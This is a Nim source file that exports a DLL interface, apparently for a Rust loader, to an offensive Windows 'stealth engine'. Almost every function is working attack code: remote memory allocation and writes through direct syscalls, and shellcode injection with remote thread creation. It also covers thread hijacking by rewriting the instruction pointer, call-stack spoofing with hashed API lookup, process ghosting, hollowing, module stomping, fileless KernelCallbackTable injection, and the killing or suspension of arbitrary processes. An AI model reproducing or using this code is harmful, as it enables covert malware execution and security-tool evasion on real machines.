import winim
import core/resolver, core/syscalls, core/blinder, core/masking, core/stealth_macros, core/utils
import injection/mapper, injection/ghosting, injection/hollowing, injection/stomping
import kct/kct_core
import kct/phantom_fiber_v4

# --- Rust FFI Exports ---

proc StealthGetHandle*(pid: uint32): HANDLE {.exportc, dynlib, cdecl.} =
    var hProcess: HANDLE = 0
    var oa: OBJECT_ATTRIBUTES
    var ci: CLIENT_ID
    ZeroMemory(addr oa, sizeof(oa))
    ZeroMemory(addr ci, sizeof(ci))
    oa.Length = sizeof(OBJECT_ATTRIBUTES).ULONG
    ci.UniqueProcess = cast[HANDLE](pid.uint)
    let status = NtOpenProcess(addr hProcess, PROCESS_ALL_ACCESS, addr oa, addr ci)
    if status == 0: return hProcess
    return 0

proc InitStealthEngine*(): int32 {.exportc, dynlib, cdecl.} =
    try:
        blinder_init()
        return 0
    except:
        return -1

proc StealthAllocate*(hProcess: HANDLE, size: SIZE_T, protect: uint32): pointer {.exportc, dynlib, cdecl.} =
    var remote_base: pointer = nil
    var remote_size: SIZE_T = size
    let status = NtAllocateVirtualMemory(hProcess, addr remote_base, 0, addr remote_size, MEM_COMMIT or MEM_RESERVE, cast[ULONG](protect))
    if status == 0: return remote_base
    return nil

proc StealthWrite*(hProcess: HANDLE, base: pointer, buffer: pointer, size: SIZE_T): int32 {.exportc, dynlib, cdecl.} =
    var bytes_written: SIZE_T
    let status = NtWriteVirtualMemory(hProcess, base, buffer, size, addr bytes_written)
    if status == 0: return 0
    return cast[int32](status)

proc StealthCreateThread*(hProcess: HANDLE, startRoutine: pointer, arg: pointer): int32 {.exportc, dynlib, cdecl.} =
    var hThread: HANDLE
    let status = NtCreateThreadEx(addr hThread, THREAD_ALL_ACCESS, nil, hProcess, startRoutine, arg, 0, 0, 0, 0, nil)
    if status == 0:
        CloseHandle(hThread)
        return 0
    return cast[int32](status)

proc StealthCreateThreadEx*(hProcess: HANDLE, startRoutine: pointer, arg: pointer, spoof: bool): int32 {.exportc, dynlib, cdecl.} =
    if not spoof: return StealthCreateThread(hProcess, startRoutine, arg)
    let gadget = find_spoof_gadget()
    if gadget == nil: return StealthCreateThread(hProcess, startRoutine, arg)
    let ntdll = get_module_base(hash_api("ntdll.dll"))
    let nt_func = get_proc_address_hashed(ntdll, hash_api("NtCreateThreadEx"))
    if nt_func == nil: return -1
    var hThread: HANDLE = 0
    let status = spoofer_stub(
        nt_func, gadget,
        cast[pointer](addr hThread), cast[pointer](THREAD_ALL_ACCESS), cast[pointer](0), cast[pointer](hProcess),
        cast[pointer](startRoutine), cast[pointer](arg), cast[pointer](0), cast[pointer](0),
        cast[pointer](0), cast[pointer](0), cast[pointer](0)
    )
    if hThread != 0:
        CloseHandle(hThread)
        return 0
    return cast[int32](status)

proc StealthProtect*(hProcess: HANDLE, base: pointer, size: uint, protect: uint32): int32 {.exportc, dynlib, cdecl.} =
    var old_protect: ULONG
    var base_ptr = base
    var region_size: SIZE_T = size.SIZE_T
    let status = NtProtectVirtualMemory(hProcess, addr base_ptr, addr region_size, protect.ULONG, addr old_protect)
    if status == 0: return 0
    return cast[int32](status)

proc StealthFree*(hProcess: HANDLE, base: pointer): int32 {.exportc, dynlib, cdecl.} =
    var base_ptr = base
    var size: SIZE_T = 0
    let status = NtFreeVirtualMemory(hProcess, addr base_ptr, addr size, MEM_RELEASE)
    if status == 0: return 0
    return cast[int32](status)

proc StealthGetContext*(hThread: HANDLE, ctx: pointer): int32 {.exportc, dynlib, cdecl.} =
    let status = NtGetContextThread(hThread, cast[PCONTEXT](ctx))
    if status == 0: return 0
    return cast[int32](status)

proc StealthSetContext*(hThread: HANDLE, ctx: pointer): int32 {.exportc, dynlib, cdecl.} =
    let status = NtSetContextThread(hThread, cast[PCONTEXT](ctx))
    if status == 0: return 0
    return cast[int32](status)

proc StealthSleep*(ms: uint32) {.exportc, dynlib, cdecl.} =
    stealth_hibernate(ms)

proc StealthCrash*(pid: uint32): int32 {.exportc, dynlib, cdecl.} =
    var hProcess: HANDLE
    var oa: OBJECT_ATTRIBUTES
    var ci: CLIENT_ID
    ZeroMemory(addr oa, sizeof(oa))
    ZeroMemory(addr ci, sizeof(ci))
    oa.Length = sizeof(OBJECT_ATTRIBUTES).ULONG
    ci.UniqueProcess = cast[HANDLE](pid.uint)
    var status = NtOpenProcess(addr hProcess, PROCESS_SUSPEND_RESUME or PROCESS_QUERY_LIMITED_INFORMATION, addr oa, addr ci)
    if status != 0: return cast[int32](status)
    status = NtSuspendProcess(hProcess)
    CloseHandle(hProcess)
    return cast[int32](status)

proc StealthKill*(pid: uint32): int32 {.exportc, dynlib, cdecl.} =
    var hProcess: HANDLE
    var oa: OBJECT_ATTRIBUTES
    var ci: CLIENT_ID
    ZeroMemory(addr oa, sizeof(oa))
    ZeroMemory(addr ci, sizeof(ci))
    oa.Length = sizeof(OBJECT_ATTRIBUTES).ULONG
    ci.UniqueProcess = cast[HANDLE](pid.uint)
    var status = NtOpenProcess(addr hProcess, PROCESS_TERMINATE, addr oa, addr ci)
    if status != 0: return cast[int32](status)
    status = NtTerminateProcess(hProcess, cast[NTSTATUS](0xDEADBEEF))
    CloseHandle(hProcess)
    return cast[int32](status)

proc StealthManualMap*(hProcess: HANDLE, buffer: pointer): uint64 {.exportc, dynlib, cdecl.} =
    return manual_map(hProcess, buffer, false)

proc StealthManualMapEx*(hProcess: HANDLE, buffer: pointer, stomp: bool): uint64 {.exportc, dynlib, cdecl.} =
    let entryPoint = manual_map(hProcess, buffer, stomp)
    return entryPoint

proc find_first_thread*(pid: uint32): uint32 =
    var te: THREADENTRY32
    te.dwSize = cast[DWORD](sizeof(THREADENTRY32))
    let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)
    if snapshot != INVALID_HANDLE_VALUE:
        if Thread32First(snapshot, addr te):
            if te.th32OwnerProcessID == cast[DWORD](pid):
                CloseHandle(snapshot)
                return cast[uint32](te.th32ThreadID)
            while Thread32Next(snapshot, addr te):
                if te.th32OwnerProcessID == cast[DWORD](pid):
                    CloseHandle(snapshot)
                    return cast[uint32](te.th32ThreadID)
        CloseHandle(snapshot)
    return 0

proc StealthFindFirstThread*(pid: uint32): uint32 {.exportc, dynlib, cdecl.} =
    return find_first_thread(pid)

proc hijack_thread*(tid: uint32, entry_point: uint64): bool =
    let hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, cast[DWORD](tid))
    if hThread == 0: return false
    if SuspendThread(hThread) == cast[DWORD](-1):
        CloseHandle(hThread)
        return false
    var ctx: CONTEXT
    ctx.ContextFlags = CONTEXT_FULL
    var status = NtGetContextThread(hThread, addr ctx)
    if status != 0:
        discard ResumeThread(hThread)
        CloseHandle(hThread)
        return false
    ctx.Rip = cast[DWORD64](entry_point)
    status = NtSetContextThread(hThread, addr ctx)
    if status != 0:
        discard ResumeThread(hThread)
        CloseHandle(hThread)
        return false
    discard ResumeThread(hThread)
    CloseHandle(hThread)
    return true

proc StealthHijackThread*(tid: uint32, entry_point: uint64): bool {.exportc, dynlib, cdecl.} =
    return hijack_thread(tid, entry_point)

proc StealthCreateRemoteThread*(hProcess: HANDLE, entry_point: uint64): bool {.exportc, dynlib, cdecl.} =
    var hThread: HANDLE
    let status = NtCreateThreadEx(
        addr hThread, THREAD_ALL_ACCESS, nil, hProcess,
        cast[pointer](entry_point), nil, 0, 0, 0, 0, nil
    )
    if status == 0:
        CloseHandle(hThread)
        return true
    return false

proc StealthInjectShellcode*(hProcess: HANDLE, shellcode: pointer, size: int): bool {.exportc, dynlib, cdecl.} =
    var pRemoteCode: pointer = nil
    var sz: SIZE_T = size.SIZE_T
    if NtAllocateVirtualMemory(hProcess, addr pRemoteCode, 0, addr sz, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE) != 0:
        return false
    var bytesWritten: SIZE_T
    if NtWriteVirtualMemory(hProcess, pRemoteCode, shellcode, size.SIZE_T, addr bytesWritten) != 0:
        return false
    var oldProtect: ULONG
    var protectAddr = pRemoteCode
    var protectSz = sz
    if NtProtectVirtualMemory(hProcess, addr protectAddr, addr protectSz, PAGE_EXECUTE_READ, addr oldProtect) != 0:
        return false
    var hThread: HANDLE
    let status = NtCreateThreadEx(
        addr hThread, THREAD_ALL_ACCESS, nil, hProcess,
        pRemoteCode, nil, 0, 0, 0, 0, nil
    )
    if status == 0:
        CloseHandle(hThread)
        return true
    return false

proc StealthGhostProcess*(payload: pointer, size: int, cmd: cstring): HANDLE {.exportc, dynlib, cdecl.} =
    var bytes = newSeq[byte](size)
    copyMem(addr bytes[0], payload, size)
    return ghost_process(bytes, $cmd)

proc StealthHollowProcess*(payload: pointer, size: int, target: cstring): HANDLE {.exportc, dynlib, cdecl.} =
    var bytes = newSeq[byte](size)
    copyMem(addr bytes[0], payload, size)
    return run_pe(bytes, $target)

proc StealthModuleStomping*(payload: pointer, size: int, target: cstring): HANDLE {.exportc, dynlib, cdecl.} =
    var bytes = newSeq[byte](size)
    copyMem(addr bytes[0], payload, size)
    return module_stomping(bytes, $target)

proc StealthKCTInject*(hProcess: HANDLE, index: int32, command: cstring): bool {.exportc, dynlib, cdecl.} =
    ## KCT Phantom Fiber v4: pagefile-backed section, no disk footprint.
    ## index = KCT slot (2 = NlsDispatchAnsiEnumerateCodePage, typical target).
    return inject_phantom_fiber_v4(hProcess, index.int, $command)

proc StealthKCTAutoInject*(hProcess: HANDLE, command: cstring): bool {.exportc, dynlib, cdecl.} =
    ## Auto-detects the best KCT slot and injects via Phantom Fiber v4.
    ## Tries slots: 2, 3, 1, 4 in order.
    for idx in [2, 3, 1, 4]:
        if inject_phantom_fiber_v4(hProcess, idx, $command):
            return true
    return false
